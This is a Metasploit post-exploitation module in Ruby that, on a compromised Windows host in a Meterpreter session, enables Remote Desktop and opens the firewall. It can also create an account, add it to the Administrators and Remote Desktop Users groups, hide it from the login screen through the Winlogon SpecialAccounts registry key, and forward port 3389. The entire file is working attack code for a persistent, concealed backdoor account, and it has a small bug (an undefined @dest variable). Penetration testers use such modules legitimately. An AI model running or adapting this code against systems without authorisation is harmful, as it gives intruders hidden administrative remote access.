##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Enable Remote Desktop',
      'Description'   => %q{
          This module enables the Remote Desktop Service (RDP). It provides the options to create
        an account and configure it to be a member of the Local Administrators and
        Remote Desktop Users group. It can also forward the target's port 3389/tcp.},
      'License'       => BSD_LICENSE,
      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('USERNAME', [ false, 'The username of the user to create.' ]),
        OptString.new('PASSWORD', [ false, 'Password for the user created.' ]),
        OptBool.new(  'ENABLE',   [ false, 'Enable the RDP Service and Firewall Exception.', true]),
        OptBool.new(  'FORDWARD', [ false, 'Forward remote port 3389 to local Port.', false]),
        OptInt.new(   'LPORT',    [ false,  'Local port to fordward remote connection.', 3389])
      ], self.class)
  end

  def run
    if datastore['ENABLE'] or (datastore['USERNAME'] and datastore['PASSWORD'])
      cleanup_rc = store_loot("host.windows.cleanup.enable_rdp", "text/plain", session,"" ,
        "enable_rdp_cleanup.rc", "enable_rdp cleanup resource file")

      if datastore['ENABLE']
        if is_admin?
          enablerd(cleanup_rc)
          enabletssrv(cleanup_rc)
        else
          print_error("Insufficient privileges, Remote Desktop Service was not modified")
        end
      end
      if datastore['USERNAME'] and datastore['PASSWORD']
        if is_admin?
          addrdpusr(datastore['USERNAME'], datastore['PASSWORD'],cleanup_rc)
        else
          print_error("Insufficient privileges, account was not be created.")
        end
      end
      if datastore['FORDWARD']
        print_status("Starting the port forwarding at local port #{datastore['LPORT']}")
        client.run_cmd("portfwd add -L 0.0.0.0 -l #{datastore['LPORT']} -p 3389 -r 127.0.0.1")
      end
      print_status("For cleanup execute Meterpreter resource file: #{cleanup_rc}")
    end
  end

  def enablerd(cleanup_rc)
    key = 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server'
    value = "fDenyTSConnections"
    begin
      v = registry_getvaldata(key,value)
      print_status "Enabling Remote Desktop"
      if v == 1
        print_status "\tRDP is disabled; enabling it ..."
        registry_setvaldata(key,value,0,"REG_DWORD")
        file_local_write(cleanup_rc,"reg setval -k \'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\' -v 'fDenyTSConnections' -d \"1\"")
      else
        print_status "\tRDP is already enabled"
      end
    rescue::Exception => e
      print_status("The following Error was encountered: #{e.class} #{e}")
    end
  end


  def enabletssrv(cleanup_rc)
    service_name = "termservice"
    srv_info = service_info(service_name)
    begin
      print_status "Setting Terminal Services service startup mode"
      if srv_info[:starttype] != START_TYPE_AUTO
        print_status "\tThe Terminal Services service is not set to auto, changing it to auto ..."
        unless (service_change_config(service_name, {:starttype => "START_TYPE_AUTO"}) == Windows::Error::SUCCESS)
          print_error("\tUnable to change start type to Auto")
        end
        file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c sc config termservice start= disabled\"")
        if (service_start(service_name) == Windows::Error::SUCCESS)
          print_good("\tRDP Service Started")
        end
        file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c sc stop termservice\"")
      else
        print_status "\tTerminal Services service is already set to auto"
      end
      #Enabling Exception on the Firewall
      print_status "\tOpening port in local firewall if necessary"
      cmd_exec('netsh', 'firewall set service type = remotedesktop mode = enable', 30)
      file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c 'netsh firewall set service type = remotedesktop mode = enable'\"")
    rescue::Exception => e
      print_status("The following Error was encountered: #{e.class} #{e}")
    end
  end



  def addrdpusr(username, password,cleanup_rc)
    rdu = resolve_sid("S-1-5-32-555")[:name]
    admin = resolve_sid("S-1-5-32-544")[:name]

    print_status "Setting user account for logon"
    print_status "\tAdding User: #{username} with Password: #{password}"
    begin
      addusr_out = cmd_exec("cmd.exe", "/c net user #{username} #{password} /add")
      if addusr_out =~ /success/i
        file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
        print_status "\tAdding User: #{username} to local group '#{rdu}'"
        cmd_exec("cmd.exe","/c net localgroup \"#{rdu}\" #{username} /add")

        print_status "\tHiding user from Windows Login screen"
        hide_user_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'
        registry_setvaldata(hide_user_key,username,0,"REG_DWORD")
        file_local_write(@dest,"reg deleteval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList -v #{username}")
        print_status "\tAdding User: #{username} to local group '#{admin}'"
        cmd_exec("cmd.exe","/c net localgroup #{admin}  #{username} /add")
        print_status "You can now login with the created user"
      else
        print_error("Account could not be created")
        print_error("Error:")
        addusr_out.each_line do |l|
          print_error("\t#{l.chomp}")
        end
      end
    rescue::Exception => e
      print_status("The following Error was encountered: #{e.class} #{e}")
    end
  end
end
